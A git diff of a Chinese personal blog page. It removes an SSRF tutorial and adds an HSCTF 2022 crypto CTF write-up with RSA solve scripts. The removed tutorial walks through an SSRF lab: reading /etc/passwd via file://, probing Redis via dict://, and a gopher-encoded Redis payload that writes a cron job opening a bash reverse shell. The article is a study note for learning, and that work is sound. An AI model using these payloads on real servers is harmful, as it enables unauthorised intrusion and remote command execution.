@@ -185,130 +185,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/11/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/11/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="post-title-link" itemprop="url">SSRF服务器端请求伪造</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-11 15:25:02" itemprop="dateCreated datePublished" datetime="2022-07-11T15:25:02+08:00">2022-07-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-13 11:31:18" itemprop="dateModified" datetime="2022-07-13T11:31:18+08:00">2022-07-13</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333">https://xz.aliyun.com/t/7333</a></p>
-<p>[TOC]</p>
-<h2 id="0x00-了解SSRF"><a href="#0x00-了解SSRF" class="headerlink" title="0x00 了解SSRF"></a>0x00 了解SSRF</h2><h3 id="SSRF简介："><a href="#SSRF简介：" class="headerlink" title="SSRF简介："></a>SSRF简介：</h3><p>SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制，本质上是属于信息泄露漏洞。</p>
-<h3 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h3><p>SSRF形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能，但是却没有对目的地址做过滤与限制。比如从指定URL地址获取网页的文本内容，加载指定地址的图片、下载等等。而且在大部分的web服务器架构中，web服务器自身是可以访问互联网和服务器所在的内网的，所以攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
-<p>而且在一般情况下，SSRF攻击的目标是外网无法访问的内部系统（即内网），所以SSRF漏洞也可以用一句话来进行总结：利用一个可以发起网络请求的服务器当作跳板来攻击内部其他服务。</p>
-<h3 id="gopher、dict协议以及redis服务、curl命令"><a href="#gopher、dict协议以及redis服务、curl命令" class="headerlink" title="gopher、dict协议以及redis服务、curl命令"></a>gopher、dict协议以及redis服务、curl命令</h3><p>gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。</p>
-<p>dict协议：一个字典服务器协议——A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号：2628。 协议详解：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html">https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html</a>           </p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html">https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html</a></p>
-<p>redis服务是在6379端口开启的，这里大致知道一下其用处即可。</p>
-<p>curl命令在SSRF漏洞有非常重要的作用，这里简单的介绍一下curl命令：</p>
-<p>curl是常用的命令行工具，用来请求Web服务器。它的名字就是客户端的URL工具的意思。不带任何参数时，curl就是发出GET请求，比如：</p>
-<p><code>curl https://www.example.com</code>，这个命令向<code>www.example.com</code>发出GET请求，服务器返回的内容会在命令行输出。</p>
-<p>curl命令的详细说明：<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
-<p>此命令的<code>-v</code>参数输出通信的整个过程，用于调试。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用file协议 curl -v file:///etc/passwd</span><br><span class="line">使用ftp协议 curl -v &quot;ftp://127.0.0.1:端口/info&quot;</span><br><span class="line">使用dict协议 curl -v &quot;dict://127.0.0.1:端口/info&quot;</span><br><span class="line">使用gopher协议 curl -v &quot;gopher://127.0.0.1:端口/_info&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="常见内网IP段"><a href="#常见内网IP段" class="headerlink" title="常见内网IP段"></a>常见内网IP段</h3><p>局域网地址范围分三类，以下IP段为内网IP段：</p>
-<p><code>C类：192.168.0.0 - 192.168.255.255</code></p>
-<p><code>B类：172.16.0.0 - 172.31.255.255</code></p>
-<p><code>A类：10.0.0.0 - 10.255.255.255</code></p>
-<h3 id="SSRF漏洞的挖掘与利用："><a href="#SSRF漏洞的挖掘与利用：" class="headerlink" title="SSRF漏洞的挖掘与利用："></a>SSRF漏洞的挖掘与利用：</h3><p>存在SSTF漏洞的站点主要利用四个协议，分别是<code>http、file、gopher、dict</code>协议。</p>
-<p><code>file</code>协议进行本地文件的读取</p>
-<p><code>http</code>协议进行内网的ip扫描、端口探测</p>
-<p>探测到<code>6379</code>端口开放，可以利用<code>http、gopher、dict</code>这几个协议来攻击开放了6379端口的redis服务。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115508-f0e8e08a-5dcb-1.png" alt="img"></p>
-<p>下面通过实践练习如何利用SSRF漏洞进行攻击。</p>
-<p>靶场下载地址和使用教程：<a target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p>
-<h3 id="ssrf-lab"><a href="#ssrf-lab" class="headerlink" title="ssrf-lab"></a>ssrf-lab</h3><p>答案地址：</p>
-<p><a target="_blank" rel="noopener" href="https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a">https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a</a></p>
-<p>重要的东西<a target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p>
-<p>OUTGOING WEBHOOK 输入的<code>https://yourhandler.io/events</code>是有 REST API 监听的需要测试项目</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115606-135773d4-5dcc-1.png" alt="img"></p>
-<p>在 SEE THE RESULT 的部分会显示请求响应的结果和状态码。下面就先测试一下<code>127.0.0.1</code>，发现有回显数据，说明这里没有对内网ip进行限制</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115630-214e0390-5dcc-1.png" alt="img"></p>
-<p>上面了解了SSRF可以通过几种协议来进行读取文件，在这里就进行测试一下：</p>
-<p>使用<code>file:///etc/passwd</code>读取用户密码,发现是可以读取</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115652-2ed303f8-5dcc-1.png" alt="img"></p>
-<p>除此之外，利用这个协议可以读取主机内任意文件。接下来可以读取配置文件和源代码方便进一步的渗透，这里之所以成功实现是因为URL没有经过严格的过滤，所以才可以利用这个协议进行任意文件读取。</p>
-<p>在上面还介绍过<code>redis</code>服务，看了很多<code>SSRF</code> 协议中的利用都是结合 Redis 服务的，所以这里就先在<code>ssrf-basics</code> 容器里面安装该服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps #查看容器编号</span><br><span class="line">$ docker exec -it 容器编号 /bin/bash #进入容器</span><br><span class="line">$ apt-get install redis-server # 安装redis服务</span><br><span class="line">$ redis-server #开启redis服务</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115712-3aa6359c-5dcc-1.png" alt="img"></p>
-<p>安装好之后，便可以利用协议收集信息及反弹 shell</p>
-<p>利用<code>dict</code>协议，<code>dict://127.0.0.1:6379/info</code>可获取本地<code>redis</code>服务配置信息</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115739-4a93543a-5dcc-1.png" alt="img"></p>
-<p>利用<code>dict://127.0.0.1:6379/KEYS *</code>获取 <code>redis</code> 存储的内容</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115759-56c333ec-5dcc-1.png" alt="img"></p>
-<p>这就是<code>dict</code>协议的简单利用，除此之外，利用<code>gopher</code>协议可以攻击<code>redis</code></p>
-<p>内网中的redis存在未授权访问漏洞，当Redis服务以root 权限运行时，利用 Gopher 协议攻击内网中的 Redis，通过写入定时任务可以实现反弹shell</p>
-<p>首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure>
-<p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于 <code>Gopher</code> 协议的 URL：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
-<p>将上面的复制粘贴到网页即可实现攻击。此exp经过url解码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115823-64fbf7b4-5dcc-1.png" alt="img"></p>
-<p>利用<code>Gopher</code> 协议还可以攻击 <code>FastCGI</code>，攻击内网 <code>Vulnerability Web</code>。具体可以参考<a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></p>
-<h2 id="SSRF常见绕过"><a href="#SSRF常见绕过" class="headerlink" title="SSRF常见绕过"></a>SSRF常见绕过</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11215#toc-7">https://xz.aliyun.com/t/11215#toc-7</a></p>
-<h2 id="一些SSTF靶场练习题"><a href="#一些SSTF靶场练习题" class="headerlink" title="一些SSTF靶场练习题"></a>一些SSTF靶场练习题</h2><h3 id="ctfshow的ssrf练习"><a href="#ctfshow的ssrf练习" class="headerlink" title="ctfshow的ssrf练习"></a>ctfshow的ssrf练习</h3><p>答案：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50589021/article/details/120183781">https://blog.csdn.net/qq_50589021/article/details/120183781</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120456960">https://blog.csdn.net/cosmoslin/article/details/120456960</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/28/%E5%B7%A5%E4%BD%9C%E5%87%86%E5%A4%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -929,6 +805,109 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/19/HSCTF9-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/19/HSCTF9-2022/" class="post-title-link" itemprop="url">HSCTF9-2022</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-19 22:34:24" itemprop="dateCreated datePublished" datetime="2022-06-19T22:34:24+08:00">2022-06-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-18 22:08:46" itemprop="dateModified" datetime="2022-07-18T22:08:46+08:00">2022-07-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>T</p>
+<p><a target="_blank" rel="noopener" href="https://hackmd.io/@aplet123/r1TIzZbYq#vending-machine-v2">https://hackmd.io/@aplet123/r1TIzZbYq#vending-machine-v2</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.y011d4.com/20220611-hsctf-writeup#homophones">HSCTF 9 Writeup | y011d4.log</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s/hsctf-9-challenges">MirRoR4s/hsctf-9-challenges (github.com)</a></p>
+<p>[TOC]</p>
+<h1 id="HSCTF"><a href="#HSCTF" class="headerlink" title="HSCTF"></a>HSCTF</h1><p>题目难度中下的一次CTF之旅，不愧是面向高中生的比赛。</p>
+<h2 id="baby-baby-rsa"><a href="#baby-baby-rsa" class="headerlink" title="baby-baby-rsa"></a>baby-baby-rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line">bits = <span class="number">768</span></span><br><span class="line">p,q = getPrime(bits),getPrime(bits)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(pt,e,n))</span><br><span class="line">bit_p = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">bit_q = <span class="built_in">bin</span>(q)[<span class="number">2</span>:]</span><br><span class="line">parts = [bit_p[<span class="number">0</span>:bits//<span class="number">3</span>],bit_p[bits//<span class="number">3</span>:<span class="number">2</span>*bits//<span class="number">3</span>],bit_p[<span class="number">2</span>*bits//<span class="number">3</span>:bits],bit_q[<span class="number">0</span>:bits//<span class="number">3</span>],bit_q[bits//<span class="number">3</span>:<span class="number">2</span>*bits//<span class="number">3</span>],bit_q[<span class="number">2</span>*bits//<span class="number">3</span>:bits]]</span><br><span class="line">random.shuffle(parts)</span><br><span class="line"><span class="built_in">print</span>(parts)</span><br></pre></td></tr></table></figure>
+<p>题目很简单，将p、q各自的二进制比特位分成三半随后打乱顺序。从组合上看这就是一个3个元素的全排列，利用itertools模块可以轻松枚举所有的p、q的二进制比特位的排列顺序。</p>
+<h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby-rsa"></a>baby-rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line">p,q = getPrime(<span class="number">512</span>),getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">a = random.randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">b = random.randint(<span class="number">0</span>,a)</span><br><span class="line">c = random.randint(<span class="number">0</span>,b)</span><br><span class="line">d = random.randint(<span class="number">0</span>,c)</span><br><span class="line">e = random.randint(<span class="number">0</span>,d)</span><br><span class="line">f = <span class="number">0x10001</span></span><br><span class="line">g = [[-a,<span class="number">0</span>,a],[-b,<span class="number">0</span>,b],[-c,<span class="number">0</span>,c],[-d,<span class="number">0</span>,d],[-e,<span class="number">0</span>,e]]</span><br><span class="line">h = <span class="built_in">list</span>(<span class="built_in">pow</span>(<span class="built_in">sum</span>(_),p,n) <span class="keyword">for</span> _ <span class="keyword">in</span> itertools.product(*g))</span><br><span class="line">random.shuffle(h)</span><br><span class="line"><span class="built_in">print</span>(h[<span class="number">0</span>:<span class="built_in">len</span>(h)//<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(pt,f,n))</span><br></pre></td></tr></table></figure>
+<p>给出五个数a、b、c、d、e，然后以这五个数为基础，构成五个具有三个元素的集合。随后再对这五个集合作笛卡尔积，随后对作完笛卡尔积后得到的新集合中的每个元素$(x_1,x_2,x_3,x_4,x_5)$ 求和$x_1+x_2+x_3+x_4+x_5$，以下简称元素的元组和。然后将和的结果进行RSA的加密运算，最后再把加密运算的结果打乱顺序告诉我们。不妨设笛卡尔积集合的某两个元素的元组和是$a,b$</p>
+<p>那么根据题目我们有：</p>
+<p>$a^p\equiv c_1 \mod n$d</p>
+<p>$b^p\equiv c_2 \mod n$</p>
+<p>根据题目的这个笛卡尔积集合的性质（观察三个元素的集合发现他们中间都有一个0），肯定存在一个元素其元组和是$a+b$，所以我们还有$(a+b)^p\equiv a^p + b^p + pX \equiv c_3 \mod n$（二项式定理）。</p>
+<p>那么这样就意味着 $(a+b)^p-a^p-b^p \equiv pX \equiv c_4 \mod n$，这就表明$c_4 \equiv 0 \mod p$</p>
+<p>这就是说c4跟n的公因数应该就是p，我们多求几对这样的c4就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="string">&#x27;C:\\Users\\mirror\\Desktop\\write-up\\HSCTF\\baby-rsa\\output.txt&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(f,<span class="string">&quot;r&quot;</span>).read().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">num = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> f]</span><br><span class="line"><span class="comment">#读取文件的时候单独复制n、ct，前面的处理没有读取到n、ct</span></span><br><span class="line">n = <span class="number">56319147982834690746853975316533145246719591165140897651231743096062383519002458932957678989024047296656519848627187749982108523549779413353513306122693067943651102381477504493441939832397586127041682373479064038277904254982764075640287544726364344375278504825481109624802050105563861419436423622873812827337</span></span><br><span class="line">ct = <span class="number">22560630408234666984622660623345600406581810801462944442925416534874150827364809064794374954441858113882177788546174341584373911768728976592365286999292769259538811140546781640416859788199247941294855485036387064352138049560948015416721112570424424100973923502360042557894202576799349475920730125529804597978</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.combinations(num,<span class="number">3</span>):</span><br><span class="line">    tmp = (i[<span class="number">0</span>]-i[<span class="number">1</span>]-i[<span class="number">2</span>])</span><br><span class="line">    tmp1 = GCD(tmp,n)</span><br><span class="line">    <span class="keyword">if</span>(tmp1!=<span class="number">1</span>):</span><br><span class="line">        p = tmp1</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="keyword">assert</span> p*q==n</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(e,phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(ct,d,n)</span><br><span class="line">        m =(long_to_bytes(m))</span><br><span class="line">        <span class="keyword">if</span>(m.startswith(<span class="string">b&#x27;flag&#x27;</span>)):</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="bucephala-albeola-the-second"><a href="#bucephala-albeola-the-second" class="headerlink" title="bucephala-albeola-the-second"></a>bucephala-albeola-the-second</h2><h2 id="homophones"><a href="#homophones" class="headerlink" title="homophones"></a>homophones</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SDFBE1X38 ILNVP 6RTC HXYUKLM 82ZH NVL JBE4CG 9A D5HE</span><br><span class="line">7WJZH5. QZAC U2GI T6 0F! ORWH5 97 T1AXYZ6FUE L2 VT8</span><br><span class="line">8XZ VKUY 15 T1UF CN JHTJI 6R9P JK4R5B.</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">plaintext = <span class="built_in">input</span>().strip()</span><br><span class="line">cleanedText = <span class="string">&quot;&quot;</span>.join(<span class="built_in">filter</span>(<span class="built_in">str</span>.isalpha,plaintext.lower()))</span><br><span class="line">result = hashlib.md5(cleanedText.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> result.digest().<span class="built_in">hex</span>()[:<span class="number">6</span>]==<span class="string">&quot;1c9ea7&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(result.digest().<span class="built_in">hex</span>()))</span><br></pre></td></tr></table></figure>
+<p>题目给了一段替换密码的密文，然后flag是对应的明文经过md5函数之后的十六进制编码。题目提示说明文是一段语法正确的英文，我没搞出来。。。</p>
+<p>密码体制的说明：<a target="_blank" rel="noopener" href="http://practicalcryptography.com/ciphers/homophonic-substitution-cipher/">Practical Cryptography</a></p>
+<p>最后是在网络上找到的答案</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Everybody knows that rolling your own crypto is very</span><br><span class="line">secure. Just look at me! There is absolutely no way</span><br><span class="line">you will be able to crack this cipher.</span><br><span class="line">#flag&#123;1c9ea7b792ebb677aeefe01d4a862b47&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_seed</span>():</span><br><span class="line">	x = <span class="number">0</span></span><br><span class="line">	<span class="comment"># x is a random integer between 0 and 100000000000</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000000</span>):</span><br><span class="line">		x += random.randint(<span class="number">0</span>, random.randint(<span class="number">0</span>, <span class="number">10</span>))</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">random.seed(secure_seed())</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(<span class="built_in">bin</span>(flag)) - <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"></span><br><span class="line">k = random.getrandbits(l)</span><br><span class="line">flag = flag ^ k <span class="comment"># super secure encryption</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<p>一个新奇的知识点是在本题当中<code>random_seed()</code>函数的返回值会在统计学上收敛于某个值，而且这个值应当不会太大，但背后的缘由我却无从知晓。但是求出收敛值的过程在网路上我没有找到答案，最后发现有这么一句话 <code>otp random(0,1) just averages to 0.5 on the long run</code>。这句话的意思应该是如果频繁调用 random.randint(0,1)求和，那么从长远来看相当于每次都加上了0.5。</p>
+<p>本题当中一共求了N=10000000000次和，观察一下其实会发现应该相当于每次加了2.5。所以收敛值应该是2.5*N。我们在这个收敛值的附近爆破种子即可。</p>
